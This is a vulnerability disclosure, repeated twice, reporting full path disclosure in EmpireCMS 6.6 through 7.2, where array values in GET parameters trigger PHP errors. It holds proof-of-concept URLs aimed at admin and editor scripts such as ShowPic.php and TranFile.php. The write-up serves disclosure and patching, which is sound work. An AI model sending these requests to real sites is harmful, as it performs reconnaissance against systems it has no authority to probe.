# EmpireCMS
EmpireCMS Bug

> [Suggested description]
> EmpireCMS 6.6 through 7.2 allows remote attackers to discover the full path via an array value for a parameter to class/connect.php.
>
> ------------------------------------------
>
> [Additional Information]
> Location:
> EmpireCMS 6.6 : /e/admin/tool/ShowPic.php
>                 /e/class/connect.php
>
> EmpireCMS 7.0 : /e/class/connect.php
>
> EmpireCMS 7.2 : /e/class/connect.php
>
> Code:
> EmpireCMS 6.6 :
> $picurl=htmlspecialchars($_GET['picurl']);
> $pic_width=htmlspecialchars($_GET['pic_width']);
> $pic_height=htmlspecialchars($_GET['pic_height']);
> $url=htmlspecialchars($_GET['url']);
>
> Rows:4
> Rows:5
> Rows:6
> Rows:7
>
> Return error :
> htmlspecialchars() expects parameter 1 to be string, array given in /www/e/admin/tool/ShowPic.php on line 4?5?6?7
>
> Code:
> EmpireCMS 6.6 :
> if($val!=addslashes($val))
>
> Rows:373
>
> Return error :
> addslashes() expects parameter 1 to be string, array given in /www/e/class/connect.php on line 373
>
>
>
> Code:
> EmpireCMS 7.0 :
> $val=htmlspecialchars($val,$flags,$char);
>
> Rows:457
>
> Return error :
> htmlspecialchars() expects parameter 1 to be string, array given in /www/e/class/connect.php on line 457
>
>
> Code:
> EmpireCMS 7.2 :
> $val=htmlspecialchars($val,$flags,$char);
>
> Rows:579
>
> Return error :
> htmlspecialchars() expects parameter 1 to be string, array given in /www/e/class/connect.php on line 579
>
>
>
> Harm:
> Web site physical path leakage .
>
> conditions for execution:
> Normal access can
>
> Edition:
> EmpireCMS 6.6
> EmpireCMS 7.0
> EmpireCMS 7.2
>
> Cause the cause :
>
> htmlspecialchars() expects parameter 1 to be string,Cause the path to leak.
> addslashes() expects parameter 1 to be string, Cause the path to leak.
>
> POC :
> EmpireCMS 6.6 :
> http://domain/e/admin/tool/ShowPic.php?url[]=kongxin&pic_height[]=kongxin&pic_width[]=kongxin&picurl[]=kongxin&
> http://domain/e/action/ListInfo.php?totalnum[]=kongxin&page[]=kongxin&myorder[]=kongxin&orderby[]=kongxin&andor[]=kongxin&ph[]=kongxin&tempid[]=kongxin&line[]=kongxin&endtime[]=kongxin&starttime[]=kongxin&ztid[]=kongxin&ttid[]=kongxin&classid[]=kongxin&mid[]=kongxin&
>
> EmpireCMS 7.0 :
> http://domain/e/admin/ecmseditor/infoeditor/epage/TranMore.php?InstanceName[]=kongxin&sinfo[]=kongxin&modtype[]=kongxin&infoid[]=kongxin&filepass[]=kongxin&classid[]=kongxin&showmod[]=kongxin&
>
> EmpireCMS 7.2 :
> http://domain/e/data/ecmseditor/infoeditor/epage/TranFile.php?filesize[]=kongxin&fname[]=kongxin&InstanceName[]=kongxin&filepass[]=kongxin&classid[]=kongxin&type[]=kongxin&showmod[]=kongxin&
>
>
>
> Fix suggestions:
> Modify the application source code to avoid information leakage.
>
> ------------------------------------------
>
> [VulnerabilityType Other]
> Physical path leaks
>
> ------------------------------------------
>
> [Vendor of Product]
> EmpireCMS
>
> ------------------------------------------
>
> [Affected Product Code Base]
> EmpireCMS - 6.6
> EmpireCMS - 7.0
> EmpireCMS - 7.2
>
> ------------------------------------------
>
> [Affected Component]
> FileMain.php , ShowPic.phpe , connect.php ,htmlspecialchars() expects parameter 1 to be string, Web site physical path leakage
>
> ------------------------------------------
>
> [Attack Type]
> Remote
>
> ------------------------------------------
>
> [Impact Information Disclosure]
> true
>
> ------------------------------------------
>
> [Attack Vectors]
> The vulnerability can be triggered by directly accessing the URL below:
> EmpireCMS 6.6 :
> http://domain/e/admin/tool/ShowPic.php?url[]=kongxin&pic_height[]=kongxin&pic_width[]=kongxin&picurl[]=kongxin&
> http://domain/e/action/ListInfo.php?totalnum[]=kongxin&page[]=kongxin&myorder[]=kongxin&orderby[]=kongxin&andor[]=kongxin&ph[]=kongxin&tempid[]=kongxin&line[]=kongxin&endtime[]=kongxin&starttime[]=kongxin&ztid[]=kongxin&ttid[]=kongxin&classid[]=kongxin&mid[]=kongxin&
>
> EmpireCMS 7.0 :
> http://domain/e/admin/ecmseditor/infoeditor/epage/TranMore.php?InstanceName[]=kongxin&sinfo[]=kongxin&modtype[]=kongxin&infoid[]=kongxin&filepass[]=kongxin&classid[]=kongxin&showmod[]=kongxin&
>
> EmpireCMS 7.2 :
> http://domain/e/data/ecmseditor/infoeditor/epage/TranFile.php?filesize[]=kongxin&fname[]=kongxin&InstanceName[]=kongxin&filepass[]=kongxin&classid[]=kongxin&type[]=kongxin&showmod[]=kongxin&
>
> ------------------------------------------
>
> [Discoverer]
> kongxin


> [Suggested description]
> EmpireCMS 6.6 allows remote attackers to discover the full path via an array value for a parameter to admin/tool/ShowPic.php.
>
> ------------------------------------------
>
> [Additional Information]
> Location:
> EmpireCMS 6.6 : /e/admin/tool/ShowPic.php
>                          /e/class/connect.php
>
> EmpireCMS 7.0 : /e/class/connect.php
>
> EmpireCMS 7.2 : /e/class/connect.php
>
> Code:
> EmpireCMS 6.6 :
> $picurl=htmlspecialchars($_GET['picurl']);
> $pic_width=htmlspecialchars($_GET['pic_width']);
> $pic_height=htmlspecialchars($_GET['pic_height']);
> $url=htmlspecialchars($_GET['url']);
>
> Rows:4
> Rows:5
> Rows:6
> Rows:7
>
> Return error :
> htmlspecialchars() expects parameter 1 to be string, array given in /www/e/admin/tool/ShowPic.php on line 4?5?6?7
>
> Code:
> EmpireCMS 6.6 :
> if($val!=addslashes($val))
>
> Rows:373
>
> Return error :
> addslashes() expects parameter 1 to be string, array given in /www/e/class/connect.php on line 373
>
>
>
> Code:
> EmpireCMS 7.0 :
> $val=htmlspecialchars($val,$flags,$char);
>
> Rows:457
>
> Return error :
> htmlspecialchars() expects parameter 1 to be string, array given in /www/e/class/connect.php on line 457
>
>
> Code:
> EmpireCMS 7.2 :
> $val=htmlspecialchars($val,$flags,$char);
>
> Rows:579
>
> Return error :
> htmlspecialchars() expects parameter 1 to be string, array given in /www/e/class/connect.php on line 579
>
>
>
> Harm:
> Web site physical path leakage .
>
> conditions for execution:
> Normal access can
>
> Edition:
> EmpireCMS 6.6
> EmpireCMS 7.0
> EmpireCMS 7.2
>
> Cause the cause :
>
> htmlspecialchars() expects parameter 1 to be string,Cause the path to leak.
> addslashes() expects parameter 1 to be string, Cause the path to leak.
>
> POC :
> EmpireCMS 6.6 :
> http://domain/e/admin/tool/ShowPic.php?url[]=kongxin&pic_height[]=kongxin&pic_width[]=kongxin&picurl[]=kongxin&
> http://domain/e/action/ListInfo.php?totalnum[]=kongxin&page[]=kongxin&myorder[]=kongxin&orderby[]=kongxin&andor[]=kongxin&ph[]=kongxin&tempid[]=kongxin&line[]=kongxin&endtime[]=kongxin&starttime[]=kongxin&ztid[]=kongxin&ttid[]=kongxin&classid[]=kongxin&mid[]=kongxin&
>
> EmpireCMS 7.0 :
> http://domain/e/admin/ecmseditor/infoeditor/epage/TranMore.php?InstanceName[]=kongxin&sinfo[]=kongxin&modtype[]=kongxin&infoid[]=kongxin&filepass[]=kongxin&classid[]=kongxin&showmod[]=kongxin&
>
> EmpireCMS 7.2 :
> http://domain/e/data/ecmseditor/infoeditor/epage/TranFile.php?filesize[]=kongxin&fname[]=kongxin&InstanceName[]=kongxin&filepass[]=kongxin&classid[]=kongxin&type[]=kongxin&showmod[]=kongxin&
>
>
>
> Fix suggestions:
> Modify the application source code to avoid information leakage.
>
> ------------------------------------------
>
> [VulnerabilityType Other]
> Physical path leaks
>
> ------------------------------------------
>
> [Vendor of Product]
> EmpireCMS
>
> ------------------------------------------
>
> [Affected Product Code Base]
> EmpireCMS - 6.6
> EmpireCMS - 7.0
> EmpireCMS - 7.2
>
> ------------------------------------------
>
> [Affected Component]
> FileMain.php , ShowPic.phpe , connect.php ,htmlspecialchars() expects parameter 1 to be string, Web site physical path leakage
>
> ------------------------------------------
>
> [Attack Type]
> Remote
>
> ------------------------------------------
>
> [Impact Information Disclosure]
> true
>
> ------------------------------------------
>
> [Attack Vectors]
> The vulnerability can be triggered by directly accessing the URL below:
> EmpireCMS 6.6 :
> http://domain/e/admin/tool/ShowPic.php?url[]=kongxin&pic_height[]=kongxin&pic_width[]=kongxin&picurl[]=kongxin&
> http://domain/e/action/ListInfo.php?totalnum[]=kongxin&page[]=kongxin&myorder[]=kongxin&orderby[]=kongxin&andor[]=kongxin&ph[]=kongxin&tempid[]=kongxin&line[]=kongxin&endtime[]=kongxin&starttime[]=kongxin&ztid[]=kongxin&ttid[]=kongxin&classid[]=kongxin&mid[]=kongxin&
>
> EmpireCMS 7.0 :
> http://domain/e/admin/ecmseditor/infoeditor/epage/TranMore.php?InstanceName[]=kongxin&sinfo[]=kongxin&modtype[]=kongxin&infoid[]=kongxin&filepass[]=kongxin&classid[]=kongxin&showmod[]=kongxin&
>
> EmpireCMS 7.2 :
> http://domain/e/data/ecmseditor/infoeditor/epage/TranFile.php?filesize[]=kongxin&fname[]=kongxin&InstanceName[]=kongxin&filepass[]=kongxin&classid[]=kongxin&type[]=kongxin&showmod[]=kongxin&
>
> ------------------------------------------
>
> [Discoverer]
> kongxin
